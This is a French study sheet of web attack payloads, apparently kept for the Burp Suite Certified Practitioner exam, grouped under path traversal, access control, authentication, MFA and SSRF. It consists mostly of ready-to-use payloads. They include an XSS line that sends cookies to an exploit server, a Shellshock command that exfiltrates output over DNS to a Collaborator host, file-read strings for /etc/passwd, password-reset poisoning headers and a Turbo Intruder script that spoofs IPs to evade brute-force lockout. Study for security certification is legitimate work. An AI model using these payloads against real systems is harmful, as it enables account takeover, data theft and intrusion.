---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- `../../../etc/passwd` — traversal simple (Unix)
- `..\..\..\windows\win.ini` — traversal simple (Windows)
- `....//` ou `....\/` — séquences imbriquées (contournement d'un retrait non récursif de `../`)
- `%2e%2e%2f` — encodage simple
- `%252e%252e%252f` — double encodage
- `..%c0%af` ou `..%ef%bc%8f` — encodage non standard
- `..%252f..%252f..%252fetc/passwd` — double encodage du seul `/` (souvent plus fiable)
- `/etc/passwd` — chemin absolu sans aucune séquence (quand `../` est bloqué)
- `filename=/var/www/images/../../../etc/passwd` — contournement validation de préfixe (chemin absolu)
- `filename=../../../etc/passwd%00.png` — contournement validation d'extension (null byte)
- Fichiers cibles : `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `C:\windows\win.ini`
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**
- Détail : [[Path-traversal-cas-simple]], [[Path-traversal-chemin-absolu]], [[Path-traversal-sequences-et-encodage]], [[Path-traversal-prefixe-et-extension]]

### Access control ([[Access-control]])
- `/admin`, `/administrator-panel-<suffixe>` — accès direct à une fonction non liée dans l'UI
- `/robots.txt`, `/sitemap.xml` — emplacements où chercher une URL sensible divulguée (voir aussi le code JS de l'interface)
- `?admin=true`, `?role=1` — contournement par paramètre de rôle contrôlable côté client
- `?id=123` → `?id=124`, `?id=1` — escalade horizontale / IDOR par manipulation d'identifiant, à tester sous un compte différent
- `GET` / `POST` / `PUT` / `DELETE` sur le même endpoint — ne pas se limiter au verbe HTTP utilisé par l'UI
- `Admin=true` (cookie) — rôle contrôlable côté client
- `"roleid":2` ajouté au corps JSON d'une mise à jour de profil — mass assignment
- `X-Original-URL: /admin` ou `X-Rewrite-URL: /admin` sur `GET /` — contournement d'un blocage d'URL par le front-end (tester d'abord `/invalid`)
- `/ADMIN/deleteUser`, `/admin/deleteUser/`, `/admin/deleteUser.anything` — variantes de chemin
- `Referer: https://site/admin` — contrôle d'accès basé sur le Referer
- `/download-transcript/1.txt` — IDOR sur fichiers statiques (décrémenter le numéro)
- Lire le corps d'une réponse `302` — des données sensibles y fuient parfois
- Détail : [[Access-control-fonctionnalite-non-protegee]], [[Access-control-parametre-utilisateur]], [[Access-control-escalade-horizontale]], [[Access-control-idor]], [[Access-control-contournement-plateforme]], [[Access-control-processus-multi-etapes-et-referer]]

### Authentication ([[Authentication]])
- `admin`, `administrator`, `prenom.nom@domaine` — noms d'utilisateur à tester en priorité
- `Password1!`, `Passw0rd`, `<motclé><année>!` — mutations de mot de passe prévisibles (substitutions leet : `o`→`0`, `a`→`4`, `e`→`3`)
- `X-Forwarded-For: <ip aléatoire>` — contournement de blocage IP (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
- `Authorization: Basic base64(username:password)` — authentification HTTP Basic
- Cookie `stay-logged-in` = `base64(username:md5(mot de passe))` — payload processing Intruder : Hash MD5, Add prefix `carlos:`, Encode Base64 ; Grep - Match sur un texte de page connectée (`Update email`)
- `<script>document.location='//EXPLOIT-SERVER/'+document.cookie</script>` — vol du cookie persistant via XSS stocké, puis craquage du hash hors ligne
- `"password":["123456","password","qwerty"]` — tableau JSON : tous les candidats dans une seule requête
- Mot de passe très long (100 caractères ou plus) — amplifie la différence de temps de réponse pour énumérer les usernames
- Intruder Cluster bomb avec Null payloads répétés 5 fois — provoquer le verrouillage pour énumérer les comptes
- Alterner `wiener:peter` et `carlos:<candidat>` (Pitchfork, une requête simultanée) — remise à zéro du compteur de blocage
- `X-Forwarded-Host: EXPLOIT-SERVER` sur `POST /forgot-password` — empoisonnement du lien de réinitialisation (tester aussi `X-Forwarded-Server`, `X-Host`)
- Supprimer `temp-forgot-password-token` de l'URL et du corps — token non revalidé
- `username=carlos&current-password=§x§&new-password-1=123&new-password-2=abc` — oracle `New passwords do not match`
- Grep - Extract sur le message d'erreur — différences subtiles (point final manquant)
- Détail : [[Auth-brute-force-identifiants]], [[Auth-contournement-blocage]], [[Auth-http-basic]], [[Auth-maintien-connexion]], [[Auth-reinitialisation-mot-de-passe]], [[Auth-modification-mot-de-passe]]
- Script Turbo Intruder pour bypass de blocage IP (1 seul marqueur position password, IP injectée par remplacement de texte sur `target.req`) :
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=1,
                              requestsPerConnection=1,
                              pipeline=False
                              )

      for password in wordlists.clipboard:
          ip = "%d.%d.%d.%d" % (
              randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)
          )
          req = target.req.replace("1.1.1.1", ip)
          engine.queue(req, password)


  def handleResponse(req, interesting):
      table.add(req)
  ```

### Multi-factor authentication ([[Multi-factor-authentication]])
- `Cookie: account=carlos` → `Cookie: account=victim-user` — manipulation du cookie de liaison d'identité entre étapes
- `0000`-`9999` ou `000000`-`999999` — brute force du code de vérification (Burp Intruder, attaque Sniper, payload type Numbers)
- `"verified":false` → `"verified":true` — réponse de vérification à surveiller/manipuler si la décision est côté client
- `/my-account` — accès direct après l'étape 1, en forçant la navigation vers une URL post-connexion sans jamais soumettre le code
- `GET /login2` avec `Cookie: verify=carlos` — génère un code pour la victime ; puis `POST /login2` avec `verify=carlos` et brute force de `mfa-code`
- Macro Burp (`GET /login`, `POST /login`, `GET /login2`) + règle de gestion de session + une requête simultanée — brute force quand la session est coupée après deux échecs
- Détail : [[MFA-acces-direct]], [[MFA-logique-defaillante]], [[MFA-brute-force-code]], [[MFA-reponse-et-secours]]

### SSRF ([[SSRF]])
- `stockApi=http://localhost/admin` — serveur local
- `stockApi=http://192.168.0.1:8080/admin` — système back-end ; position Intruder sur le dernier octet, payload Numbers de 1 à 255, trier par statut
- `http://127.1/`, `http://2130706433/`, `http://017700000001/`, `http://0x7f000001/`, `http://[::1]/` — représentations alternatives de `127.0.0.1` (liste noire)
- `http://127.1/%2561dmin` — double encodage d'une lettre du chemin bloqué
- `http://spoofed.burpcollaborator.net` — nom de domaine qui résout vers `127.0.0.1`
- `https://expected-host:fakepassword@evil-host` — identifiants avant l'hôte (liste blanche)
- `https://evil-host#expected-host` — fragment (liste blanche)
- `https://expected-host.evil-host` — hiérarchie DNS (liste blanche)
- `http://localhost:80%2523@stock.weliketoshop.net/admin` — `@` plus `#` double-encodé (liste blanche)
- `/product/nextProduct?path=http://192.168.0.12:8080/admin` — redirection ouverte vers l'hôte interne
- `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` — SSRF aveugle via l'analyseur de trafic ; relever Collaborator avec « Poll now »
- `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` avec `Referer: http://192.168.0.X:8080` — Shellshock en aveugle, balayage du dernier octet
- Hors formation, à garder en tête : `http://169.254.169.254/` (métadonnées cloud), `file://`, `gopher://`
- Détail : [[SSRF-serveur-local]], [[SSRF-systemes-back-end]], [[SSRF-filtre-liste-noire]], [[SSRF-filtre-liste-blanche]], [[SSRF-redirection-ouverte]], [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]
